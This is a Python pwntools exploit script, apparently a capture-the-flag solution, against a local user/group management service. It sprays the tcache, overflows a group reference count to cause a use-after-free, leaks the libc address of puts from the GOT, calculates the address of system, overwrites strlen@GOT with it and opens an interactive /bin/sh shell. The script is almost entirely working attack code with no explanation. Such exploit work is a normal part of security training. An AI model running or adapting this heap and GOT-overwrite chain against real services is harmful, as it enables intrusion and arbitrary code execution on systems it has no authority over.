from pwn import *
import time

p64 = lambda v: struct.pack("<Q", v)
u64 = lambda v: struct.unpack("<Q", v.ljust(8, '\0'))[0]



s = remote("127.0.0.1", 4444)

def recv_menu():
  return s.recvuntil("Action: ")

def add_user(name, group, age):
  s.sendline("0")
  s.recvuntil("name: ")
  s.sendline(name)
  s.recvuntil("group: ")
  s.sendline(group)
  s.recvuntil("age: ")
  s.sendline(str(age))

def delete_user(idx):
  s.sendline("4")
  s.recvuntil("index: ")
  s.sendline(str(idx))

def display_user(idx):
  s.sendline("2")
  s.recvuntil("index: ")
  s.sendline(str(idx))

def edit_group(idx, val):
  s.sendline("3")
  s.recvuntil("index: ")
  s.sendline(str(idx))
  s.recvuntil("(y/n): ")
  s.sendline("y")
  s.recvuntil("name: ")
  s.sendline(val)

def edit_group_no_propagate(idx, val):
  s.sendline("3")
  s.recvuntil("index: ")
  s.sendline(str(idx))
  s.recvuntil("(y/n): ")
  s.sendline("n")
  s.recvuntil("name: ")
  s.sendline(val)

recv_menu()
size_spray = 23

for i in xrange(7):
  log.info("putting %dth entry in tcache" % i)
  add_user("Y"*0x90, "A"*size_spray, 8)
  recv_menu()
  delete_user(0)
  recv_menu()

add_user("Y"*0x90, "A"*size_spray, 8)
recv_menu()

log.info("Overflowing refcount")

add_user("Z"*0x90, "B"*size_spray, 14)
recv_menu()

for i in xrange(255):
  time.sleep(0.01)
  edit_group_no_propagate(1, "B"*size_spray) 
  recv_menu()
  if i % 16 == 0:
      log.info("%%%d done..." % int((float(i)/255) * 100)) 


log.info("Overflown")

log.info("Wait for GC pass")
time.sleep(2)

add_user("W"*0x90,"A"*size_spray, 8)
assert "created" in recv_menu()
add_user("W"*0x90, "A"*size_spray, 8)
assert "created" in recv_menu()

strlen_got = 0x602030
_IO_puts_got = 0x602028

log.info("Leaking some libc pointers...")
edit_group(1, p64(0x10) + p64(_IO_puts_got) + p64(strlen_got))
display_user(3)
s.recvuntil("Name: ")
_IO_puts = s.recv(6)
_IO_puts = u64(_IO_puts)
system = _IO_puts - 0x2a300
system = _IO_puts - 0x78460 + 0x47dc0 # 17.10
#system = _IO_puts - 0x2b280 # 17.04
log.info("_IO_puts: 0x%x" % _IO_puts)
log.info("system: 0x%x" % system)
recv_menu()

log.info("Overwriting strlen@GOT")
time.sleep(0.2)
edit_group(3, p64(system))
recv_menu()
time.sleep(0.2)
log.info("Shell time")
add_user("/bin/sh", "A"*size_spray, 8)

s.interactive()

#s.interactive()
